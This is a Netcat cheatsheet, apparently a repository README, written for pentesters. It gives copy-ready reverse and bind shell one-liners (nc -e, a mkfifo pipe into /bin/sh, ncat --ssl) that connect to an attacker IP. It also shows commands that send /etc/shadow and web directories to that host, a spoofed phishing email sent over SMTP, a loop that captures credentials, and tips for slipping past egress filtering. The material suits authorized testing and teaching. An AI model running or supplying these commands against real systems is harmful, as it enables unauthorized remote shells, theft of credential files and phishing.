# 🔌 Netcat (nc) - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```

<p align="center">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocols TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
</p>

<p align="center">
  <b>🌐 Read and write raw data across network connections using TCP and UDP protocols</b>
</p>

---

## 📋 Table of Contents

- [Overview & The Netcat Philosophy](#-overview--the-netcat-philosophy)
- [Netcat Variants & The Flavor Dilemma](#-netcat-variants--the-flavor-dilemma)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Traditional Netcat (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Tool Comparison: Netcat Variants vs Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Installation & Switching Variants](#-installation--switching-variants)
- [Core Command-Line Flags](#-core-command-line-flags)
- [Port Scanning & Banner Grabbing](#-port-scanning--banner-grabbing)
- [Reverse & Bind Shells](#-reverse--bind-shells)
  - [Traditional Shell Execution (`-e`)](#traditional-shell-execution--e)
  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Encrypted TLS Shell with Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [File Transfer Techniques](#-file-transfer-techniques)
  - [Target to Attacker (Exfiltration)](#target-to-attacker-exfiltration)
  - [Attacker to Target (Payload Delivery)](#attacker-to-target-payload-delivery)
  - [On-the-Fly Directory Archiving (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Port Forwarding & Network Relays](#-port-forwarding--network-relays)
- [Web Server & Honeypot Emulation](#-web-server--honeypot-emulation)
- [Network Debugging & Manual Protocol Interaction](#-network-debugging--manual-protocol-interaction)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & The Netcat Philosophy

Originally authored in 1995 by **Hobbit**, **Netcat** (often invoked simply as `nc`) is celebrated across the cybersecurity and Unix communities as the **"TCP/IP Swiss Army Knife"**. 

Unlike high-level application protocols or bloated management tools, Netcat does one thing exceptionally well: **it opens raw byte-level network pipes over TCP or UDP sockets and connects them directly to standard input (`stdin`) and standard output (`stdout`)**.

Whether you are listening for reverse shells, establishing covert exfiltration channels, banner grabbing services, transferring files without SMB/FTP, or diagnosing firewall packet filtering, Netcat remains an indispensable utility in every security practitioner's arsenal.

---

## ⚖️ Netcat Variants & The Flavor Dilemma

One of the most frequent sources of confusion during penetration tests and CTF challenges is that **multiple distinct implementations share the `nc` command**. Understanding which variant you are interacting with dictates the syntax and payload possibilities.

```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```

### OpenBSD Netcat (`nc.openbsd`)
- **Default on:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Key trait:** By default, compiled without the `-e` (execute program) flag to prevent trivial arbitrary code execution vulnerabilities.
- **Identifying syntax:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Shell execution workaround:** Uses Linux named pipes (`mkfifo`) to bridge `stdin` and `stdout` back into `/bin/sh`.

### Traditional Netcat (`nc.traditional`)
- **Original author:** Hobbit (v1.10).
- **Key trait:** Compiled with the `-DGAPING_SECURITY_HOLE` directive, allowing the native `-e` / `-c` flag (`nc -e /bin/bash`).
- **Identifying syntax:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```

### Nmap Ncat (`ncat`)
- **Maintained by:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Key trait:** A modern rewrite supporting **TLS/SSL encryption**, IP access control lists (`--allow`, `--deny`), connection brokering (`--broker`), SOCKS4/5 proxying, and cross-platform native execution.

---

## ⚖️ Tool Comparison: Netcat Variants vs Socat

| Feature | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|------------------|----------------------|---------------|---------|
| **Executable Flag (`-e`)** | ❌ Stripped | ✅ Native (`-e`) | ✅ Native (`-e`, `--exec`) | ✅ Native (`EXEC:`) |
| **SSL / TLS Encryption** | ❌ No | ❌ No | ✅ Native (`--ssl`) | ✅ Native (`OPENSSL:`) |
| **FIFO Pipe Shells** | ✅ Yes (`mkfifo`) | ✅ Yes | ✅ Yes | ✅ Yes |
| **Port Scanning Mode** | ✅ Yes (`-z`) | ✅ Yes (`-z`) | ❌ No | ❌ No |
| **Persistent Listener** | ✅ Yes (`-k`) | ❌ No (Exits on disconnect) | ✅ Yes (`-k`, `--keep-open`) | ✅ Yes (`fork`) |
| **IPv6 Support** | ✅ Native (`-6`) | ❌ Limited | ✅ Native (`-6`) | ✅ Native |
| **Proxy / SOCKS Client** | ✅ Yes (`-X`, `-x`) | ❌ No | ✅ Yes (`--proxy`) | ✅ Full Proxy support |
| **Multi-Client Chat / Broker**| ❌ No | ❌ No | ✅ Native (`--broker`) | ❌ Manual setup |
| **Default on Kali / Debian** | ✅ Yes (`/bin/nc`) | 🔄 Available (`apt`) | 🔄 Available (`ncat`) | 🔄 Available (`socat`) |

---

## 📥 Installation & Switching Variants

On Debian-based distributions (including Kali Linux), you can install all flavors and switch between them via `update-alternatives`:

```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```

To explicitly execute a specific variant without changing system-wide defaults:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```

---

## ⚙️ Core Command-Line Flags

| Flag | Meaning & Description |
|------|-----------------------|
| `-l` | **Listen mode**: Wait for inbound connections instead of initiating outbound. |
| `-v` | **Verbose mode**: Print detailed connection and diagnostic information (`-vv` for higher verbosity). |
| `-n` | **Numeric-only IP**: Disable reverse DNS resolution for speed and stealth. |
| `-p <port>` | **Local port**: Specify the local port to bind or listen on. |
| `-u` | **UDP mode**: Use UDP protocol instead of the default TCP stream. |
| `-k` | **Keep listening**: Keep listening and accepting new connections after a client disconnects. |
| `-w <sec>` | **Timeout**: Timeout in seconds for connection establishment and idle socket reads. |
| `-z` | **Zero-I/O mode**: Scanning mode; send no payload data and close socket immediately after handshaking. |
| `-q <sec>` | **Quit after EOF**: Wait specified seconds after receiving EOF on `stdin` before terminating. |
| `-s <ip>` | **Source IP**: Bind to a specific local interface / source IP address. |
| `-4` / `-6` | Force IPv4 or IPv6 addressing exclusively. |

---

## 🔍 Port Scanning & Banner Grabbing

While dedicated tools like `nmap` or `masscan` are preferred for comprehensive sweeps, Netcat provides an instant, zero-dependency port check when you land on a restricted target.

### Fast Port Scanning

```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```

### Service Banner Grabbing

Banner grabbing extracts raw version strings from remote daemons for vulnerability identification:

```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```

---

## 💀 Reverse & Bind Shells

Connecting a remote command interpreter (`/bin/sh`, `/bin/bash`, `cmd.exe`) over a Netcat socket is one of the most fundamental penetration testing techniques.

### Traditional Shell Execution (`-e`)

If the target system has `netcat-traditional` or `ncat` installed with execution support:

```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```

### OpenBSD FIFO Named Pipe Reverse Shell

On modern Debian, Ubuntu, Kali, and Fedora distributions, `nc` lacks the `-e` flag. Use a **FIFO (First-In-First-Out) named pipe** to redirect standard input and standard output:

```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```

#### How the FIFO Pipeline Works:
1. `rm -f /tmp/f`: Removes any stale pipe file.
2. `mkfifo /tmp/f`: Creates a special named FIFO pipe in `/tmp`.
3. `cat /tmp/f`: Reads input delivered into the pipe and forwards it to `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: Spawns an interactive shell, redirecting standard error (`stderr`) to standard output (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: Passes the shell output over the network to the attacker, while writing received network keystrokes back into `/tmp/f`.

### OpenBSD FIFO Bind Shell

When the target has a routable public or local IP and inbound firewall rules permit traffic:

```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```

### Encrypted TLS Shell with Ncat (`--ssl`)

Unencrypted Netcat traffic can be inspected by IDS/IPS and network taps. `ncat` supports TLS/SSL encryption natively:

```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```

---

## 📁 File Transfer Techniques

When SSH, SCP, FTP, and SMB are blocked or uninstalled, Netcat provides an instant, bidirectional file transfer pipeline over any open TCP port.

### Target to Attacker (Exfiltration)

```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```

### Attacker to Target (Payload Delivery)

```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```

### Integrity Verification (Checksums)

Always verify byte integrity after raw Netcat transfers:

```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```

### On-the-Fly Directory Archiving (`tar + nc`)

Transfer entire directory structures without creating intermediate temporary archive files on the victim's disk:

```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```

---

## 🔀 Port Forwarding & Network Relays

Netcat can act as a lightweight network relay without requiring SSH port forwarding:

```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```

---

## 🌐 Web Server & Honeypot Emulation

### Minimalist Single-File HTTP Server

Serve a static HTTP payload or capture credentials submitted by browsers:

```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```

### Multi-Client Chat / Message Broker (`ncat`)

Ncat includes a built-in broker mode, creating an ad-hoc IRC-like relay room for red team operators:

```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```

---

## 🛠️ Network Debugging & Manual Protocol Interaction

### Raw SMTP Mail Injection

```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```

### Raw POP3 Mail Retrieval

```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Standard Listener** | `nc -lvnp <PORT>` |
| **Persistent Listener** | `nc -lvnp <PORT> -k` |
| **Connect to Remote Host** | `nc -vn <HOST> <PORT>` |
| **Connect via UDP** | `nc -u -vn <HOST> <PORT>` |
| **Port Scan TCP (Fast)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Port Scan UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD Named Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Traditional Shell (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Encrypted SSL Shell (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Receive File (Exfil Listener)**| `nc -lvnp <PORT> > output_file` |
| **Send File (Exfil Sender)** | `nc -vn <IP> <PORT> < input_file` |
| **Stream Folder via Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Extract Streamed Folder** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Banner Grabbing** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Defensive Considerations & OPSEC

1. **Unencrypted Cleartext Warning:**
   - Standard Netcat does **not** employ cryptographic encapsulation. Any passwords, session tokens, or shell commands sent over cleartext `nc` can be extracted by Network Security Monitoring (NSM) sensors (Zeek, Suricata, Wireshark).
   - Use `ncat --ssl` or wrap traffic inside an SSH/TLS tunnel whenever possible.
2. **Process Auditing & Sysmon:**
   - On Linux systems, process execution logging (`auditd`, eBPF, Falco) flags invocations of `nc` containing flags like `-e` or commands creating `/tmp/f` and `mkfifo`.
   - On Windows, EDR agents routinely flag or quarantine `nc.exe` binaries due to known static signatures.
3. **Firewall Inbound Restrictions:**
   - Always choose common outbound ports (`80`, `443`, `53`) when configuring reverse shell listeners to circumvent strict egress filtering policies.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> This cheatsheet is designed for authorized penetration testing, vulnerability assessment, CTF competitions, and system administration purposes only. Intercepting network traffic, exfiltrating data, or executing reverse shells against systems without explicit written consent is illegal and punishable under cybersecurity laws worldwide. Use responsibly and ethically.